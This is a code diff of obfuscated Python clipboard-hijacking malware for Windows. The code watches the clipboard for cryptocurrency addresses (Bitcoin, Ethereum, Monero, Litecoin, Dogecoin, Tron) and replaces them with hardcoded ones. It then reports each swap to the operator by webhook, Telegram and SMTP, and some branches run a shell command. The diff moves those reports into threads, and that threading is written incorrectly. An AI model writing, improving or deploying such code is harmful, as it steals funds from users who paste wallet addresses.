@@ -13,8 +13,8 @@ import os as ewsjinf783
 import platform as btrrf98
 import shutil as euifew
 import sys as wzf8u4w7
-import winreg as ef9uh77
-
+import winreg as ef9uh77 
+import threading as wefuh4323
 
 xwwwrew = "%Brgxer%"
 dsfrsdjk = "%Zrxgre%"
@@ -179,13 +179,13 @@ def vdsu281cjm():
             awd42321dsa.copy(hrextr_R2Xoy1)
 
             if deswsjn != "" or " " or "%webhook%":
-                redugh8(frewsuih.title, "Bitcoin [BTC]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=redugh8(frewsuih.title, "Bitcoin [BTC]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != "" or " " or "%tele%":
-                egreger453645(frewsuih.title, "Bitcoin [BTC]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=egreger453645(frewsuih.title, "Bitcoin [BTC]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if regh54 != "" or " " or "%smtp%":
-                gesnui(frewsuih.title, "Bitcoin [BTC]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=gesnui(frewsuih.title, "Bitcoin [BTC]", hfruieoawd, hrextr_R2Xoy1)).start()
 
     elif wadyhe_cery22 == True:
         frewsuih = yxvcre.getActiveWindow()
@@ -197,13 +197,13 @@ def vdsu281cjm():
             awd42321dsa.copy(hrextr_R2Xoy2)
 
             if deswsjn != "" or " " or "%webhook%":
-                redugh8(frewsuih.title, "Ethereum [ETH]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=redugh8(frewsuih.title, "Ethereum [ETH]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != "" or " " or "%tele%":
-                egreger453645(frewsuih.title, "Ethereum [ETH]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=egreger453645(frewsuih.title, "Ethereum [ETH]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if regh54 != "" or " " or "%smtp%":
-                gesnui(frewsuih.title, "Ethereum [ETH]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=gesnui(frewsuih.title, "Ethereum [ETH]", hfruieoawd, hrextr_R2Xoy1)).start()
 
 
     elif wadyhe_cery33 == True:
@@ -216,13 +216,13 @@ def vdsu281cjm():
             awd42321dsa.copy(hrextr_R2Xoy3)
 
             if deswsjn != "" or " " or "%webhook%":
-                redugh8(frewsuih.title, "Monero [XMR]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=redugh8(frewsuih.title, "Monero [XMR]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != "" or " " or "%tele%":
-                egreger453645(frewsuih.title, "Monero [XMR]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=egreger453645(frewsuih.title, "Monero [XMR]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if regh54 != "" or " " or "%smtp%":
-                gesnui(frewsuih.title, "Monero [XMR]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=gesnui(frewsuih.title, "Monero [XMR]", hfruieoawd, hrextr_R2Xoy1)).start()
 
     elif wadyhe_cery44 == True:
         frewsuih = yxvcre.getActiveWindow()
@@ -234,13 +234,13 @@ def vdsu281cjm():
             awd42321dsa.copy(hrextr_R2Xoy4)
 
             if deswsjn != "" or " " or "%webhook%":
-                redugh8(frewsuih.title, "Litecoin [LTC]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=redugh8(frewsuih.title, "Litecoin [LTC]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != "" or " " or "%tele%":
-                egreger453645(frewsuih.title, "Litecoin [LTC]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=egreger453645(frewsuih.title, "Litecoin [LTC]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if regh54 != "" or " " or "%smtp%":
-                gesnui(frewsuih.title, "Litecoin [LTC]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=gesnui(frewsuih.title, "Litecoin [LTC]", hfruieoawd, hrextr_R2Xoy1)).start()
 
 
     elif wadyhe_cery55 == True or wadyhe_cery555 == True or wadyhe_cery5555 == True:
@@ -253,13 +253,13 @@ def vdsu281cjm():
                     pass
                 awd42321dsa.copy(hrextr_R2Xoy5)
                 if deswsjn != "" or " " or "%webhook%":
-                    redugh8(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if kuhio49 != "" or " " or "%tele%":
-                    egreger453645(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=egreger453645(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if regh54 != "" or " " or "%smtp%":
-                    gesnui(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
             elif wadyhe_cery00 is not None and wadyhe_cery00.group() != hrextr_R2Xoy5:
                 try:
                     xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
@@ -267,13 +267,13 @@ def vdsu281cjm():
                     pass
                 awd42321dsa.copy(hrextr_R2Xoy5)
                 if deswsjn != "" or " " or "%webhook%":
-                    redugh8(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if kuhio49 != "" or " " or "%tele%":
-                    egreger453645(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=egreger453645(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if regh54 != "" or " " or "%smtp%":
-                    gesnui(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
             elif wadyhe_cery000 is not None and wadyhe_cery000.group() != hrextr_R2Xoy5:
                 try:
                     xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
@@ -281,13 +281,13 @@ def vdsu281cjm():
                     pass
                 awd42321dsa.copy(hrextr_R2Xoy5)
                 if deswsjn != "" or " " or "%webhook%":
-                    redugh8(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if kuhio49 != "" or " " or "%tele%":
-                    egreger453645(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=egreger453645(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
 
                 if regh54 != "" or " " or "%smtp%":
-                    gesnui(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, "Dogecoin [DOGE]", hfruieoawd, hrextr_R2Xoy1)).start()
     elif wadyhe_cery66 == True:
         frewsuih = yxvcre.getActiveWindow()
         if wadyhe_cery6.group() != hrextr_R2Xoy6:
@@ -297,13 +297,13 @@ def vdsu281cjm():
                 pass
             awd42321dsa.copy(hrextr_R2Xoy6)
             if deswsjn != "" or " " or "%webhook%":
-                redugh8(frewsuih.title, "Tron [TRX]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=redugh8(frewsuih.title, "Tron [TRX]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if kuhio49 != "" or " " or "%tele%":
-                egreger453645(frewsuih.title, "Tron [TRX]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=egreger453645(frewsuih.title, "Tron [TRX]", hfruieoawd, hrextr_R2Xoy1)).start()
 
             if regh54 != "" or " " or "%smtp%":
-                gesnui(frewsuih.title, "Tron [TRX]", hfruieoawd, hrextr_R2Xoy1)
+                wefuh4323.Thread(target=gesnui(frewsuih.title, "Tron [TRX]", hfruieoawd, hrextr_R2Xoy1)).start()
 
     else:
         pass
